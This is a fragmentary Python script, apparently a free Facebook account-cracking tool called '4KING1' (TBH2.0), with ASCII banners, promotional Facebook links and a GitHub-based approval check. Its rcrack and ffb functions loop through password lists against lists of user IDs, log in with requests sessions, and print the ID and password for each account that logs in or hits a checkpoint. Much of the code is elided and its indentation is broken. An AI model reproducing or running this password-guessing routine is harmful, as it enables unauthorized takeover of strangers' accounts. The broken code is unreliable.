#assalamowalikom OPEN source by Md Shimul (TBH2.0)
...
import os,base64
os.system("xdg-open https://www.facebook.com/groups/647002200235764/?ref=share&mibextid=NSMWBT")
...
logo=("""\033[1;32m
  _______ ____  _    _ ___    ___    _____ _     _                 _ 
 |__   __|  _ \| |  | |__ \  / _ \  / ____| |   (_)               | |
    | |  | |_) | |__| |  ) || | | || (___ | |__  _ _ __ ___  _   _| |
    | |  |  _ <|  __  | / / | | | | \___ \| '_ \| | '_ ` _ \| | | | |
    | |  | |_) | |  | |/ /_ | |_| | ____) | | | | | | | | | | |_| | |
    |_|  |____/|_|  |_|____(_)___(_)_____/|_| |_|_|_| |_| |_|\__,_|_|
                                                                     
                                                                     
--------------------------------------------------
[â€¢]\033[1;32mCREATED BY     : \033[1;32mMd Shimul \033[1;32m
[â€¢]\033[1;32mFACEBOOK       : \033[1;32mMd Shimul Sha\033[1;32m
[â€¢]\033[1;32mSTATUS         : \033[1;32mFREE\033[1;32m
--------------------------------------------------
\033[1;32m[ðŸ”¥]  4KING1
\033[1;32m[ðŸ”¥]Facbook Group TBH2.0
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/4KING1.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/4KING1.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/4KING1.txt\033[0;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [4KING1] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [4KING1] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;32m [4KING1-0K] '+ids+' | '+pas)
					else:
...
def menu_apikey():
 ...
 \033[1;32m=================================================
\033[1;32m[+] AUTHOR    :\033[1;32m Md Shimul Sha
\033[1;32m[+] GITHUB    :\033[1;32m 4KING1
...
==================================================   """)
  ...
  os.system('xdg-open https://www.facebook.com/mdshimul.sha.98?mibextid=zLoPMf')
  print("");time.sleep(2)
  print("\x1b[1;32m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/4KING1/TBH/commit/bd712cb4c4d257f399b1ec7e9cc08d110f0eea2e").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/4KING1/TBH/commit/bd712cb4c4d257f399b1ec7e9cc08d110f0eea2e').text
